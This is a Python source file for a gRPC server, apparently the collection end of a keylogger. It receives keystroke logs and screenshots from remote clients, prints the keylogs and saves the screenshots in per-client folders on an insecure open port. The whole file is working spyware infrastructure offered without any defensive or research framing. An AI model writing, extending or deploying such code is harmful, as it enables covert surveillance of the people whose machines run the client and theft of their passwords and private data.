import grpc
import os
from concurrent import futures
from datetime import datetime
from .protos import server_pb2 as keylog_pb2
from .protos import server_pb2_grpc as keylog_pb2_grpc

# Default folder for received screenshots
SCREENSHOTS_FOLDER = "./received_screenshots"

# Triggered action definitions
def on_keylog_received(message, client_info=None):
    """Called when a keylog message is received."""
    print(f"[KEYLOG] {message}")
    # Additional actions can be added here (save to file, alert, etc.)

def on_screenshot_received(filepath, client_id, timestamp):
    """Called when a screenshot is received and saved."""
    print(f"[SCREENSHOT] Saved: {filepath} from {client_id} at {timestamp}")


class KeylogServer(keylog_pb2_grpc.KeylogServiceServicer):
    def __init__(self, screenshots_folder=None, keylog_callback=None, screenshot_callback=None):
        """
        Initialize the KeylogServer.
        
        Args:
            screenshots_folder: folder to save received screenshots (default: ./received_screenshots)
            keylog_callback: function(message) called when keylog received
            screenshot_callback: function(filepath, client_id, timestamp) called when screenshot saved
        """
        self.screenshots_folder = screenshots_folder or SCREENSHOTS_FOLDER
        self.keylog_callback = keylog_callback or on_keylog_received
        self.screenshot_callback = screenshot_callback or on_screenshot_received
        
        # Ensure screenshots folder exists
        os.makedirs(self.screenshots_folder, exist_ok=True)
    
    def SendKeylog(self, request, context):
        """Handle incoming keylog message."""
        message = request.message
        self.keylog_callback(message)
        return keylog_pb2.KeylogResponse(response=True)
    
    def SendScreenshot(self, request, context):
        """Handle incoming screenshot data."""
        try:
            image_data = request.image_data
            filename = request.filename
            timestamp = request.timestamp
            client_id = request.client_id
            
            # Create client-specific subfolder
            client_folder = os.path.join(self.screenshots_folder, client_id)
            os.makedirs(client_folder, exist_ok=True)
            
            # Ensure unique filename
            if not filename:
                filename = f"screenshot_{timestamp}.png"
            
            # Add timestamp prefix to avoid overwrites
            base, ext = os.path.splitext(filename)
            unique_filename = f"{timestamp}_{base}{ext}"
            
            filepath = os.path.join(client_folder, unique_filename)
            
            # Save the screenshot
            with open(filepath, 'wb') as f:
                f.write(image_data)
            
            # Call the callback
            self.screenshot_callback(filepath, client_id, timestamp)
            
            return keylog_pb2.ScreenshotResponse(
                success=True,
                message=f"Screenshot saved: {unique_filename}"
            )
            
        except Exception as e:
            return keylog_pb2.ScreenshotResponse(
                success=False,
                message=f"Error saving screenshot: {str(e)}"
            )
    
    def serve(self, host="0.0.0.0", port=50051):
        """Start the gRPC server."""
        server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))
        keylog_pb2_grpc.add_KeylogServiceServicer_to_server(self, server)
        server.add_insecure_port(f"{host}:{port}")
        print(f"[*] gRPC Server starting on {host}:{port}")
        print(f"[*] Screenshots will be saved to: {self.screenshots_folder}")
        server.start()
        server.wait_for_termination()


# Only run server if this file is executed directly
if __name__ == "__main__":
    server_instance = KeylogServer()
    server_instance.serve()
